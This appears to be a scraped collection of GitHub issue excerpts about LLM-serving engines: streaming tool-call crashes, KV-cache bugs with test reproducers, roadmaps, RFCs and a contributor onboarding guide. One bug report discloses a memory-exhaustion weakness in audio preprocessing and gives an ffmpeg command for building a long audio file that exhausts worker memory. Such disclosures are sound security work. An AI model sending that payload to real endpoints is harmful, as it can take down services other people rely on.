`split_delta()` decomposes a compound `DeltaMessage` in the fixed order reasoning → content → tool_calls. When the tool-call part of the compound delta is the *argument tail* of an already-open tool call (its first `DeltaToolCall` carries no function name — e.g. the flush emitted by the parser engine at `</tool_call>`), replaying it *after* reasoning/content means the state machine has already transitioned away and closed the call. The tail then forces `SimpleStreamingEventProcessor.open()` to construct `ResponseFunctionToolCallItem(name=None)`, which fails pydantic validation. Because the SSE response has already started, the exception aborts the stream without any terminal event.

### Reproducing the problem

Serve the model with the configuration above, then send an agentic, tool-heavy prompt to `/v1/responses` with `stream: true`. The crash is intermittent (depends on where step boundaries fall relative to tool-call boundaries) but recurs reliably in tool-heavy workloads with speculative decoding enabled.

### Impact and workaround

We cannot use the `/v1/responses` streaming path for this deployment. As a workaround we set `use_chat_completions: true` in LiteLLM to route traffic through `/v1/chat/completions`, which loses the Responses API path for this deployment. There is no release containing a fix, so we are stuck on a dev build with no supported upgrade path.

items.title: [Feature]: Logprobs on parsed path streaming `/derender`
items.author: hickeyma
items.body_excerpt:
### 🚀 The feature, motivation and pitch

Streaming `/derender` with a reasoning or tool parser (#50550) doesn't return logprobs. #55029 added streaming logprobs but only on the unparsed path. The parsed path builds its stream choices without them. A client that streams with `logprobs: true` through a parser gets nothing back.

Agreed on #47161 (https://github.com/vllm-project/vllm/issues/47161#issuecomment-5893681568): the engine is the reference for logprob token strings. Standalone `/derender`, including the parsed path should use one shared resolver built on `convert_ids_list_to_tokens` and `_correct_decoded_token` with parity tests against the engine.

Scope:

- Resolve each chunk's logprobs and attach them to whatever delta the parser emits. `/v1/chat/completions` does the same, with one `logprobs.content` list no matter which field the tokens land in.
- Update `logprob_context_token_ids` on the parsed path, like the plain path does. Keep it starting empty, like the engine.
- Drop logprobs on every chunk when `include_reasoning=false` with a parser, like the engine does.
- Fix batch derender too. `_derender_chat` clears `reasoning` but still returns the logprobs.
- Add parity tests against `/v1/chat/completions` with `include_reasoning` on and off, a chunk the parser swallows (tool-call markup) and a multi-byte char split across chunks.

`DerenderStreamState` stays as is. Chunk logprobs already cover only that chunk's tokens and replay never touches them, so no cursor is needed. #59510 handles streaming stop with a 400, so no pending text field either.

~Blocked on #58181 (still open).~ The shared helper (`decode_token_ids`) and the parity tests depend on it.

@shimib has offered to take this. @hyeongyun0916 will review and help with repros.

### Alternatives

Re-resolving token strings separately in the parsed path. We ruled this out on #47161 because the paths already disagree (see #59241).

### Additional context

- #47161: RFC thread where this was agreed
- #55029: streaming logprobs for the unparsed path
- #50550: parser aware streaming derender
- #58181 / #57574: `GenerateLogProbs` with integer token IDs
- #59241 / #59252: SentencePiece leading space dropped in derender logprob strings
- #57052 / #59510: stop handling on derender. #59510 makes streaming `/derender` return 400 on `stop` and notes that logprobs aren't trimmed to the cut text.

The output of python collect_env.py ```text vLLM 0.30.0 (the latest release) and 0.28.0, CPU, Python 3.12, Ubuntu 24.04, x86_64 ```
### 🐛 Describe the bug `xLAMToolParser.extract_tool_calls_streaming` extracts each call's `arguments` object with a regular expression that allows only one inner level of braces and ignores string literals. items.title: [Bug] pause_generation(mode="keep", clear_cache=True) raises when a streaming-input session is parked between turns
items.author: shivasathishs-rp
items.body_excerpt:
## What breaks

`pause_generation(mode="keep", clear_cache=True)` raises `RuntimeError` and leaves the engine in `PauseState.PAUSED_ALL` whenever a resumable streaming-input session is parked between turns.

That call is verbatim the recipe in `docs/training/async_rl.md:18`:

```python
await engine.pause_generation(mode="keep", clear_cache=True)
```

It is also the only one of the four mode/clear_cache combinations that is both cache-sound and trajectory-preserving, and it is the only one that fails.

| mode | clear_cache | result |
|---|---|---|
| keep | True | **RuntimeError** |
| keep | False | ok, KV computed under the old weights survives the update |
| abort | True | ok, trajectory destroyed |
| abort | False | ok, trajectory destroyed |

Over HTTP this is `POST /pause?mode=keep`, where `clear_cache` defaults to `True`. The exception is caught by the generic handler at `vllm/entrypoints/rl/online/api_router.py:70` and returned as HTTP 500 at `api_router.py:74`.

## Reproducer

Pure CPU. No GPU, no weights, no model. Drop next to `tests/v1/core/test_scheduler.py::test_scheduler_reset_prefix_cache`.

The parking helper is lifted from the suite's existing `test_pause_new_ignores_streaming_session_waiting_for_input` (`tests/v1/core/test_scheduler.py:2710`), so this is the suite's own notion of a parked session rather than a hand-built state.

```python
def _park_streaming_session(scheduler):
    """Stop a resumable streaming request so it parks between turns."""
    stop_token = 7
    (session,) = create_requests(
        num_requests=1, num_tokens=4, stop_token_ids=[stop_token], req_ids=["s"]
    )
    session.resumable = True
    scheduler.add_request(session)
    output = scheduler.schedule()
    scheduler.update_from_output(
        output,
        ModelRunnerOutput(
            req_ids=["s"], req_id_to_index={"s": 0}, sampled_token_ids=[[stop_token]]
        ),
    )
    return session


def test_reset_prefix_cache_with_parked_streaming_session():
    scheduler = create_scheduler(enable_prefix_caching=True)
    session = _park_streaming_session(scheduler)

    assert session.status == RequestStatus.WAITING_FOR_STREAMING_REQ
    assert session in scheduler.kv_holding_waiting
    assert not scheduler.running
    # The parked session still holds its KV blocks.
    assert scheduler.kv_cache_manager.get_block_ids("s")[0]

    with pytest.raises(RuntimeError, match="Failed to reset KV cache"):
        scheduler.reset_prefix_cache(reset_running_requests=True)
```

That is the smallest failing call. One parked session is enough; one block held is enough.

Going through `EngineCore` reproduces the documented call and shows the second half of the problem, which is the state the engine is left in:

```python
def test_keep_pause_clear_cache_with_parked_streaming_session():
    scheduler = create_scheduler(enable_prefix_caching=True)
    _park_streaming_session(scheduler)

    core = object.__new__(EngineCore)
    core.scheduler = scheduler
    core.model_executor = Mock(is_sleeping=False)
    core.mm_receiver_cache = None
    core.batch_queue = None

    with pytest.raises(RuntimeError, match="Failed to reset KV cache"):
        core.pause_scheduler(mode="keep", clear_cache=True)

    # The engine is left paused: the pause state is set before the cache reset.
    assert core.is_scheduler_paused()
    assert scheduler.pause_state == PauseState.PAUSED_ALL
```

### Traceback

Captured before the `pytest.raises` wrapper was added.

```
tests/v1/core/test_scheduler.py: in test_keep_pause_clear_cache_with_parked_streaming_session
    core.pause_scheduler(mode="keep", clear_cache=True)
vllm/v1/engine/core.py:932: in pause_scheduler
    self._finish_pause(clear_cache)
vllm/v1/engine/core.py:904: in _finish_pause
    self._reset_caches()
vllm/v1/engine/core.py:891: in _reset_caches
    if not self.reset_prefix_cache(
vllm/v1/engine/core.py:859: in reset_prefix_cache
    return self.scheduler.reset_prefix_cache(
vllm/v1/core/sched/scheduler.py:2869: RuntimeError
E   RuntimeError: Failed to reset KV cache even when all the running requests are
    preempted and moved to the waiting queue. This is likely due to the presence of
    running requests waiting for remote KV transfer, which is not supported yet.

------------------------------ Captured log call -------------------------------
WARNING  vllm.v1.core.block_pool:block_pool.py:839 Failed to reset prefix cache because some blocks (1) are not freed yet
```

## Code path

Six links, each read at the commit below.

**1. A resumable request is not finished, so it is never freed.** `vllm/v1/core/sched/scheduler.py:2464`, `_handle_stopped_request` returns `False` for a resumable request after setting `WAITING_FOR_STREAMING_REQ` and calling `_enqueue_waiting_request`. The caller at `scheduler.py:2227` calls `_free_request` only on `True`.

**2. The request leaves `self.running` and lands in `kv_holding_waiting`.** Removal at `scheduler.py:2294`. `_enqueue_waiting_request` at `scheduler.py:2456` routes to `kv_holding_waiting` when `_holds_kv_blocks(request)` is true.

**3. `_holds_kv_blocks` is true for this request.** `scheduler.py:2444`. A session with trajectory tokens has `num_computed_tokens > 0`. Its own comment names the case: "While always the case when status is `WAITING_FOR_REMOTE_KVS` or `WAITING_FOR_STREAMING_REQ`".

**4. `reset_prefix_cache(reset_running_requests=True)` drains only `self.running`.** `scheduler.py:2839`, drain loop at `scheduler.py:2857-2859`. The string `kv_holding_waiting` does not appear anywhere in that function, so a parked session is never drained and its blocks are never released.

**5. `block_pool.reset_prefix_cache()` returns `False` because a block is still in use.** `vllm/v1/core/block_pool.py:827`, the used-block check at `block_pool.py:838`, the warning at `block_pool.py:839`. The repro log shows `blocks (1) are not freed yet`.

**6. The scheduler raises.** `if` at `scheduler.py:2868`, `raise` at `scheduler.py:2869

items.title: [Feature] Parallelize module loading to speed up server launch and refit for Diffusion models
items.author: zhaochenyang20
items.body_excerpt:
### Checklist

- [x] If this is not a feature request but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Motivation

Based on the detailed breakdown in issue #19087, the current launch process for SGLang Diffusion (using Qwen-Image as an example) is heavily bottlenecked by module loading, which currently happens sequentially.

As shown in the profiling results, `load_modules` takes approximately 63.20s out of the total 77.09s launch time (~82%).

- `text_encoder`: 32.96s (52% of loading time)
- `transformer`: 29.76s (47% of loading time)
- `vae/tokenizer/scheduler`: < 1s combined.

Since these modules (Text Encoder, Transformer, VAE) are independent during the instantiation and weight-loading phase, the current sequential execution is suboptimal. We should implement a parallel loading strategy for `load_modules`. By using multi-threading (e.g., `concurrent.futures.ThreadPoolExecutor` or other parallel weights load strategies in SGLang LLM already) to trigger the initialization and weight transfer of the text encoder and transformer simultaneously, we may theoretically reduce the module loading time from ~63s to ~33s (the max of the two major components).

Benefits:

1. Faster Cold Start: Significantly reduces the time for `launch_server`.
2. Optimized Refit/Wake-up: As discussed in #19090, if we support offloading and waking up, parallelizing the weight reload from CPU/Disk to GPU will make the "wake-up" latency much lower.

Implementation Consideration:

1. Ensure thread safety for CUDA context operations during `model.to(device)`.
2. Monitor Peak CPU memory usage when loading multiple state dicts into RAM simultaneously before moving them to GPU.


---------


Apart from this, it should also be helpful to validate whether we are loading the weights with Pageable memory.


https://github.com/sgl-project/sglang/issues/19087#issuecomment-3937649804

Spend 32s in loading `text_encoder` looks strange, since if we are using Pinned memory, the load speed could be much higher.

items.title: [Roadmap] Prefill-Decode Disaggregation Roadmap (2026 Q4)
items.author: ShangmingCai
items.body_excerpt:
## Motivation
Prefill-Decode Disaggregation is now the default way people run SGLang at scale, and over the last two quarters we have made it work with almost every model family, every parallel strategy (TP/PP/CP/DCP/DP-attention), HiCache, and speculative decoding (see the Q2 roadmap https://github.com/sgl-project/sglang/issues/21703 for the history).

The cost of that is visible in the code: three transfer backends that each carry their own copy of the protocol, a KVCache lifecycle that is only correct because of a long list of patches, and a decode side that still reserves every destination slot in HBM up front. So for Q4 the theme is less "support one more combination" and more "make the thing we already have correct, memory-efficient, and better coordinated with the router":

1. One protocol layer, per-backend transport (https://github.com/sgl-project/sglang/issues/34510).
2. KVCache liveness as an invariant, not a patch series.
3. Pre-allocate decode KV slots in HiCache / host memory instead of VRAM, and move the KV into VRAM once the transfer is done.
4. Router/engine coordination for agentic prefix reuse.

## Shared-protocol unification
Tracker: https://github.com/sgl-project/sglang/issues/34510, RFC: https://github.com/sgl-project/sglang/issues/33861 @jambow0320 @livingshade 

Mooncake / NIXL / Mori each implement bootstrap, room lifecycle, chunk orchestration, timeout, heartbeat, abort, and failure handling in their own `conn.py`. Every change has to be written up to three times: the liveness fixes below, every new model's KV layout, and every new parallelism combination. The target is one `KVManager / KVSender / KVReceiver / KVBootstrapServer` and a `BaseTransport` that only names remote memory and moves `(src, dst, len)`.

- [x] Step 0 / Step 1: behavior audit and low-risk alignment of the three backends (bootstrap timeout, heartbeat, ABORT delivery, stale-work skip, shared failure notification) https://github.com/sgl-project/sglang/pull/37077
- [ ] Step 2: per-backend transport extraction (`MooncakeTransport` / `NixlTransport` / `MoriTransport`), starting from the sender/receiver consolidation https://github.com/sgl-project/sglang/pull/41140 @jambow0320
- [ ] Step 3: write down the three decisions we keep re-deciding in review threads: completion/failure delivery channel (transport notifications vs the ZMQ status channel), abort/quiescence (ABORT_ACK means "drained", not "received"), room generation / tombstones
- [ ] Step 4: common protocol classes, `get_kv_class` → `make_transport`, and the Fake backend becomes `NullTransport` so the whole protocol runs in CPU-only CI
- [ ] Explicit request role and a canonical per-component `TransferPlan`, so layouts are validated before transport submission instead of inferred from payload shape https://github.com/sgl-project/sglang/issues/37765 @IvanShan177
- [ ] Wire version + rolling-upgrade story: a version frame and a dual-parse window before Step 4 changes the frames
- [ ] New backends land as a `Transport`, not as a fourth `conn.py` (UniFlow https://github.com/sgl-project/sglang/pull/43437 @yexiangd)

## KVCache liveness and transfer correctness
A KV slot is not free when the allocator says so; it is free when every remote writer has finished. This year we closed a whole family of silent cross-request corruption bugs that came from freeing decode slots while RDMA writes were still landing (first reported by Z.ai, reproduced and audited by @kflansburg in https://github.com/sgl-project/sglang/pull/38961). As of v0.5.21 the hold is on by default on Mooncake and NIXL for every failure kind, and Mori joined on main.

- [x] Deferred decode-side KV release until per-rank drain ACK or timeout, default-on https://github.com/sgl-project/sglang/pull/35049 https://github.com/sgl-project/sglang/pull/41023
- [x] Generation-tagged ABORT/ABORT_ACK in the common layer, every failure kind defers, Mori under the hold https://github.com/sgl-project/sglang/pull/37077 https://github.com/sgl-project/sglang/pull/41404 @livingshade
- [x] Sibling races closed: intake-rejected requests never reach a handoff, HiCache retraction waits for the offload, decode restore outcome is TP-consistent, router cancels the paired decode on prefill failure https://github.com/sgl-project/sglang/pull/38935 https://github.com/sgl-project/sglang/pull/43562 https://github.com/sgl-project/sglang/pull/41612
- [x] Opt-in KV transfer checksums and deferred-release metrics https://github.com/sgl-project/sglang/pull/39500 https://github.com/sgl-project/sglang/pull/41128 @cctry

## HiCache integration: pre-allocate in host memory, decode in VRAM
Today decode reserves a request's whole destination range in HBM at bootstrap, so a slow or long prefill occupies decode capacity that running requests need. The direction is: pre-allocate the destination slots in HiCache / CPU memory, receive the transfer there, and move the KV into VRAM once the transfer is done and the request is admitted to the decode phase.

- [x] Decode host receive: at a device-usage threshold, incoming KV lands in the pinned host pool and is restored on admission https://github.com/sgl-project/sglang/pull/40238 @cctry
- [x] Unified-memory decode host pools https://github.com/sgl-project/sglang/pull/39478 @ZYHowell
- [x] `--disaggregation-decode-allocation-policy prefill_complete`: reserve destination KV only once the final prefill result is accepted https://github.com/sgl-project/sglang/pull/40703 @ekrim
- [ ] Pre-allocate decode destination slots in CPU memory by default for long-context decode, with HBM allocated at admission time. Host receive is the mechanism, but no in-tree backend sets `supports_host_destination` yet. What is missing: host destinations for Mooncake / NIXL / Mori, reconciling host receive with deferred-release accounting, and measuring the restore cost against the extra concurrency.
- [ ] L2-only decode radix cache: keep the decode prefix tree in host memory and stage into HBM per batch https://gi

items.title: [Bug] Decoded audio duration and sample count are unbounded during multimodal preprocessing
items.author: JPengLi
items.body_excerpt:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

`load_audio` decodes the entire audio stream into memory with no duration, sample-count, channel-count, or decoded-byte ceiling:

- `python/sglang/srt/utils/common.py:1872-1963` normalizes caller input and invokes the decoder.
- TorchCodec path calls `decoder.get_all_samples()` at lines 1917-1925.
- SoundFile fallback calls `sf.read(source)` at lines 1938-1942.
- PyAV path in `multimodal/audio_from_video.py:89-128` appends every resampled frame and then `np.concatenate(chunks)`.
- `multimodal/processors/base_processor.py:993-997` passes attacker-controlled audio data directly to this function.

A compressed audio container can therefore be small on the wire but expand to hours of PCM in memory. If resampling is needed, the fallback also creates an additional floating-point tensor before returning a NumPy waveform.


### Reproduction

This source-audit reproduction needs an audio-capable model. In an isolated environment, create a long mono FLAC file:

```bash
ffmpeg -f lavfi -i "anullsrc=r=16000:cl=mono" \
  -t 21600 -c:a flac long-silence.flac
```

Submit it to an audio-capable chat endpoint as an `audio_url` data URL or through the engine's `audio_data` input. Set generation length to the minimum and monitor worker RSS/cgroup memory.

At 16 kHz mono, 21,600 seconds decodes to 345.6 million samples. Depending on the decoder and resampler, this becomes hundreds of MB to multiple GB before feature extraction. Multiple concurrent requests multiply the peak.

A negative control should use the same container format with a short clip (for example, one second) to show that the issue is specifically the absent duration/sample cap rather than container support.

### Evidence

Source on `51686cf8e7fee0ae773c5c9b8ede356507abef7b`:

```python
samples = decoder.get_all_samples()
```

```python
audio, original_sr = sf.read(source)
```

```python
chunks: list[np.ndarray] = []
for packet in container.demux(audio_stream):
    for frame in packet.decode():
        _append_resampled_frames(chunks, resampler.resample(frame), mono=mono)
...
waveform = np.concatenate(chunks, axis=0)
```

No argument in these paths represents a maximum duration or maximum decoded samples. The `asr_max_buffer_seconds` server option is used by the realtime/audio-session path; it is not a cap applied to this generic `load_audio` path.

### Impact

**Availability:High**

A request with a modest compressed payload can cause unbounded PCM expansion, CPU-heavy decoding/resampling, large transient allocations, queue starvation, or worker OOM. 

Prerequisites:
- A model or endpoint that passes user audio through `load_audio`.
- Attacker-controlled audio bytes or URL.
- No outer proxy enforcing both encoded size and decoded duration.``

### Environment


items.title: [RFC] Context-parallel support for the unified L3 key scheme
items.author: momaek
items.body_excerpt:
## Summary

We propose extending `plan_unified_kv` with an explicit ownership rule for each attention-CP mode, so the unified key scheme (#33651) can lift its `attn_cp_size > 1` guard instead of falling back to rank-suffixed keys. Each mode gets a writer rule: replicated CP elects one writer, LayerSplit CP is keyed like a PP stage, and KV cache sharding has each page's owner write the whole page. We would like to agree on the design before sending PRs stacked on #39728.

cc @Shunkangz (unified key scheme, KV cache sharding) @Dovis01 (DSA cache layer split, #29421)

## Motivation

We serve GLM-5.3 (78 layers, DSA) with PD disaggregation on Hopper, using two prefill shapes that should share prefix KV through one Mooncake L3:

| Prefill shape | Parallelism |
| --- | --- |
| DP prefill | DP8 attention, one node |
| LayerSplit prefill | Interleave prefill CP8 with `--enable-dsa-cache-layer-split`; each rank stores about 1/8 of the layers |

Requests move between the two as prompts grow, so a prefix written by one shape is often read by the other. Upstream has no working path for this today:

- **HiCache L3 + LayerSplit does not start.** Mooncake forces the layout away from `layer_first`, while layer-sharded backup only supports `layer_first`. `backup_skip` also lets only `tp_rank == 0` write, which is right for replicated MLA but wrong when each rank owns different layers (details in #37122).
- **The direct linker does not know LayerSplit.** The DSA pool group in `linker_pool_assembler.py` is built over the full `layer_num`.
- **The unified key scheme rejects all CP.** `plan_unified_kv` raises `NotImplementedError` when `attn_cp_size > 1`.

We currently bridge the gap with out-of-tree patches that write per-rank shard keys and reassemble pages across topologies. That works, but each new topology pair needs its own assemble path, which is exactly the coupling the unified scheme removes. We would rather fix this in the scheme.

## Proposal: one ownership rule per CP mode

Today a rank's plan is a layer range × a set of head groups. We add the CP mode as an input; each mode then says which unified-key objects the rank holds completely, so it is their single writer. Keys stay exactly as #39727 defines them; only the writer set changes.

| CP mode | What one rank holds | Who writes each object | What it needs |
| --- | --- | --- | --- |
| Replicated CP (every rank holds every page and layer, as #30501 describes prefill CP today) | Full pages, all layers | One elected rank, e.g. CP rank 0 | A fixed election rule; no key change |
| LayerSplit CP (`--enable-dsa-cache-layer-split`) | A contiguous layer range, all tokens of each page | Each rank, for its own layer chunks | Chunk-aligned split; the "only the last range may end short" check becomes `end == num_layers` instead of `is_final_stage` |
| KV cache sharding (`--enable-kv-cache-sharding`) | Whole physical pages, all layers | The page's owner (`owner(loc)`) | Writer filter by page owner, in step with #43778's host-page ownership |

The token-sliced CP case named in #39727's error message (ranks holding sub-page slices) stays out of scope here.

Two properties fall out of this. First, LayerSplit is PP from the storage point of view: a contiguous absolute layer range per rank, so the existing `_layer_chunks` logic applies unchanged once the split is chunk-aligned. Second, KV sharding matches on physical pages (per `page_interleave.py`), and each physical page lives on one rank with all its layers, so it writes exactly the objects a DP or TP member writes, on whatever `layer_partition` the fleet uses.

## LayerSplit: a chunk-aligned split

`get_layer_shard_range` gains a chunk size P: it cuts the layers into P-sized chunks and gives each rank a contiguous run of whole chunks. P = 1 reproduces today's split exactly, so the default changes nothing.

The change is required. Today 78 layers over 8 ranks split as 10 × 6 + 9 × 2, so ranges start at 0, 10, …, 60, **69**. `_layer_chunks` requires every start to be a multiple of `layer_partition`, which forces P = 1. With P = 1 every page becomes 78 KV objects of about 41 KiB each, plus one indexer object per indexer layer, multiplying Mooncake master RPCs and metadata by roughly 78× for every fleet member, including DP readers.

With P = 10 the max layers per rank is still 10, so memory is unchanged, and each rank writes exactly one chunk:

| CP rank | Today | P = 10 | Full indexer layers in the chunk | KV object size |
| --- | --- | --- | --- | --- |
| 0 | [0, 10) | [0, 10) | 0, 1, 2, 6 | ~410 KiB |
| 1 | [10, 20) | [10, 20) | 10, 14, 18 | ~410 KiB |
| 2 | [20, 30) | [20, 30) | 22, 26 | ~410 KiB |
| 3 | [30, 40) | [30, 40) | 30, 34, 38 | ~410 KiB |
| 4 | [40, 50) | [40, 50) | 42, 46 | ~410 KiB |
| 5 | [50, 60) | [50, 60) | 50, 54, 58 | ~410 KiB |
| 6 | [60, 69) | [60, 70) | 62, 66 | ~410 KiB |
| 7 | [69, 78) | [70, 78) | 70, 74 | ~328 KiB |

Sizes assume 656 B per token per layer (FP8 MLA latent + rope) and page size 64; a whole 78-layer page is ~3.1 MiB. A DP reader on the same grid reads 8 KV objects per page instead of 1. CP4 or CP2 members get whole chunks the same way, so any CP size shares keys with DP, TP and PP members as long as the fleet agrees on P.

Other changes:

1. **PD transfer is unaffected in principle.** Prefill reports `prefill_start_layer` / `prefill_end_layer` per rank and decode pairs on those, not on the split rule. We will still run a PD regression.
2. **Host pool.** LayerSplit backs up one owned layer at a time and only supports `layer_first` today. It needs a `page_unified` per-layer write-back; the load direction already exists (#39726).

## DSA indexer and MTP draft layers

Neither is covered by the #33651 stack yet, and every CP mode needs both.

**Indexer as a second component.** We propose an `_indexer` object at the same coordinate as `_k`: `{page_hash}_{digest}_L{a}-{b}_indexer` next to `{page_hash}_{digest}_L{a}-{b}_k`. Only layers with a real indexer go into it. GLM-5.3

items.title: [Onboarding 2026] Good first issues — start contributing to LMCache in one PR
items.author: maobaolong
items.body_excerpt:
👋 Welcome to join lmcache slack channel. https://join.slack.com/t/lmcacheworkspace/shared_invite/zt-4d1c2uk6t-55YZVvOQnJFNeAJK32U~Gg 

👋 Welcome to LMCache! This umbrella issue is the **single entry point** for first-time
contributors. If you've never sent a PR to LMCache before, start here.

> If you're looking for the older onboarding thread, see #627. This 2026 version
> focuses on smaller, well-scoped tasks with a friendly step-by-step PR workflow.

---

## 0. Before you start

- Read [`CONTRIBUTING.md`](../blob/dev/CONTRIBUTING.md). The most important parts:
  - Base branch is `dev`. Open PRs against `dev`, not `main`.
  - Every Python file starts with `# SPDX-License-Identifier: Apache-2.0`.
  - Imports are grouped as `# Standard / # Third Party / # First Party / # Local`.
  - Line length is **88**, formatter is `ruff format`, lint is `ruff check`.
  - Never access `_private` members of other classes (SLF rule).
  - Public functions/methods need **type hints** + **docstring**.
- Set up the environment:
  ```bash
  uv venv --python 3.12 && source .venv/bin/activate
  uv pip install -e . --no-build-isolation
  uv pip install -r requirements/test.txt
  pre-commit install
  ```

## 1. How to claim a task

These tasks are mainly for new contributors to learn the LMCache issue-to-PR workflow. Please claim **only one good-first issue at a time**. If you already have an assigned good-first issue or an open good-first PR, finish that work before taking another one, and leave the remaining tasks for other newcomers.

1. Pick **one** sub-issue below that has no assignee and no `🔒 claimed` comment.
2. Comment exactly: `/claim` (or `I'd like to work on this 🙋`).
   A maintainer will assign it to you within ~2 business days.
3. If you go silent for 7 days we'll un-assign so others can pick it up — totally fine,
   just leave a comment if you need more time.

## 2. Branch & commit

```bash
git checkout dev && git pull
git checkout -b gfi/<issue-number>-short-slug
# ... do the work ...
git commit -s -m "short imperative summary"   # -s is required (DCO)
```

- **Sign-off is required** (`-s`). PRs without DCO sign-off cannot be merged.
- Keep the PR small: one issue = one PR.

## 3. Local checks (must pass before pushing)

```bash
pre-commit run --all-files
pytest -xvs tests/<the_file_you_touched>.py    # if applicable
```

## 4. Open the PR

**PR title format** (please follow):

```
[good-first-issue] <area>: <imperative summary>  (#<sub-issue-number>)
```

Examples:
- `[good-first-issue] docs: fix broken link in quickstart (#1801)`
- `[good-first-issue] tests: add unit test for FooBar.flush (#1802)`
- `[good-first-issue] lint: add SPDX header to scripts/foo.py (#1803)`

**PR description** — please use this template (the repo's PR template already
gives you the skeleton; just fill it in):

```markdown
**What this PR does / why we need it**:
Closes #<sub-issue-number>
Refs #<this umbrella issue number>

<one or two sentences describing the change>

**Special notes for your reviewers**:
- This is my first PR to LMCache 🙇 please be gentle.
- I ran `pre-commit run --all-files` locally — all green.
- I ran `pytest -xvs tests/...` — all green.

**If applicable**:
- [ ] this PR contains user facing changes - docs added
- [ ] this PR contains unit tests
```

> Tip: writing `Closes #1234` in the description auto-closes the sub-issue when the
> PR is merged. Keep `Refs #<umbrella>` so the umbrella stays linked.

## 5. Finding a reviewer

You don't need to find one yourself — `.github/CODEOWNERS` will auto-request
the right people based on the files you changed. If the PR sits idle for **3 working
days**, leave a polite comment like:

> Friendly ping — PTAL when you have a moment 🙏 cc @<one CODEOWNER from the file you changed>

If you really can't tell who to ping, default to:
- Tests / CI / packaging → @hickeyma @sammshen @ApostaC @deng451e
- Docs / examples → @sammshen @deng451e
- Storage backends → @maobaolong @sammshen @chunxiaozheng
- Core engine / memory → @ApostaC @YaoJiayi @sammshen
- Multiprocess → @ApostaC @OasisGit @hlin99

(See [`.github/CODEOWNERS`](../blob/dev/.github/CODEOWNERS) for the full map.)

## 6. Responding to review comments

This is the part most newcomers miss — please follow it, it makes everyone happier:

1. **Address every comment.** For each thread:
   - If you agree → push a fix and reply `Done in <commit-sha>`.
   - If you disagree → explain politely, propose an alternative.
   - If you don't understand → ask! Reviewers expect questions.
2. **Don't force-push** during review (it loses inline-comment context). Just add
   commits; we'll squash on merge.
3. **Re-request review explicitly** once all threads are resolved:
   > Addressed all comments, PTAL again 🙏 @reviewer1 @reviewer2

   `PTAL` = "Please Take Another Look". Tag every reviewer who left comments.
4. If CI is red, fix it before pinging — reviewers will skip red PRs.


---

## 7. How to create and claim a sub-issues

- You can extend the new cli commend line tools, ref to https://github.com/LMCache/LMCache/pull/3719 and https://github.com/LMCache/LMCache/pull/3678

---

Stuck? Drop a message in the `#contributors` channel of our
[Slack](https://join.slack.com/t/lmcacheworkspace/shared_invite/zt-3g8e6xzz8-KzS_HI8bPERGFK5PTB~MYg)
or comment here. We're happy to help. 🙌


**Maintainers**: please update this checklist as sub-issues are filed.

---

## Next step: Good second issues

Finished your first PR? Head over to **#5751 — [Good second issues — next step after your first PR](https://github.com/LMCache/LMCache/issues/5751)** for your next small, well-scoped task.

items.title: [RFC][MP][L2] End-to-end integrity check for the fs L2 adapter (CRC32 trailer, verify on load)
items.author: malikoyv
items.body_excerpt:
## Summary

The MP `fs` L2 adapter checks only a file's **length** when it loads a KV chunk. A file of the right size but with wrong bytes is served to the engine as a cache hit. The model then produces fluent garbage, and users debug the model rather than the cache.

This RFC proposes an **opt-in** integrity check:
- On store, write a small trailer (magic + CRC32) after the payload.
- On load, verify it; a mismatch becomes a cache miss and the file is deleted.

A draft implementation with tests is ready. I'd like agreement on the on-disk format and the failure semantics before opening the PR.

## Motivation

Silent-corruption reports keep reaching the tracker, and each was found by a person reading bad output rather than by LMCache:

- **#4991:** `fs_native` failed stores stay visible and cache hits produce gibberish. The analysis there found two concurrent writers of one key sharing a staging file, which leaves a torn file in place.
- **#5263:** a buffer is reclaimed while an L2 load is still writing into it.

A checksum does not fix any of these root causes. It turns an L2 content error into a detected miss, so the engine recomputes instead of silently serving wrong KV. Some related reports are not L2 content errors and a checksum would **not** catch them: #5344 (a tensor-parallel shard never written to L1) and #4247 (layout/view mismatch). This RFC is scoped to the L2 bytes.

Ways the same-size wrong bytes can reach `fs` today:
1. **Torn concurrent writes.** Writers of the same key share one temp path. The Python `fs` adapter uses the same `<name>.tmp` pattern as `fs_native`.
2. **Files from another writer or version** in a shared or reused directory.
3. **Media or firmware errors** (silent data corruption): rare per drive, but non-zero at fleet scale.
4. **Power loss or crash.** There is no `fsync` before rename, so after a crash a renamed file can contain stale or zeroed blocks.

What exists today:

| Mechanism | Covers |
|---|---|
| `fs` load length check | Truncated files only |
| AES-GCM serde | Tampering, but only when encryption with key management is enabled |
| `POST /cache/checksums` | Manual GPU-block debugging, not the load path |

## Proposal

**Config.** A new `fs` adapter field, a string rather than a boolean so it can gain algorithms later:

```json
{"type": "fs", "base_path": "/data/lmcache/l2", "checksum": "crc32"}
```

`"none"` is the default and keeps today's on-disk format byte for byte.

**On-disk format** (with `crc32`):

```
<payload bytes> | trailer: magic "LMC1" (4 B) | zlib.crc32(payload) (4 B, little-endian)
```

- Under `use_odirect`, the trailer is padded to one filesystem block so all writes stay aligned. Readers only look at the first 8 bytes after the payload, so buffered and O_DIRECT files are readable by either mode.
- The magic carries a format version (`LMC1`), so the layout can change later without misreading old files.

**Load semantics.**
- The payload is re-hashed off the adapter's event loop (`run_in_executor`; `zlib.crc32` releases the GIL on large buffers).
- A mismatch, missing trailer or unknown magic becomes a **miss** for that key. The prefetch controller already treats it as a gap, and the engine recomputes.
- The file is **deleted**, and listeners get `on_l2_keys_deleted`. Otherwise the key would miss forever: `_execute_store` skips existing files, and `fs` never evicts.

**Accounting.** Store reports the full file length, so usage stays consistent with `delete()`, which subtracts `st_size`.

**Related fix.** On the O_DIRECT path, check the byte count `os.write` returns. Today a short write is renamed into place as if complete.

## Cost

A typical chunk: Llama-3-8B, bf16, 256 tokens, about 32 MiB.

| | Overhead |
|---|---|
| Space | 8 B per file (one extra 4 KiB block allocated; 4 KiB under O_DIRECT), about 0.01% |
| Extra read bandwidth | 8 B per load (at most one extra 4 KiB page) |
| CPU per store and per load | One CRC32 pass. Measured on one host with zlib-ng 1.3.1: about 48 GB/s per core, about 0.7 ms per 32 MiB. Classic zlib is several times slower. |

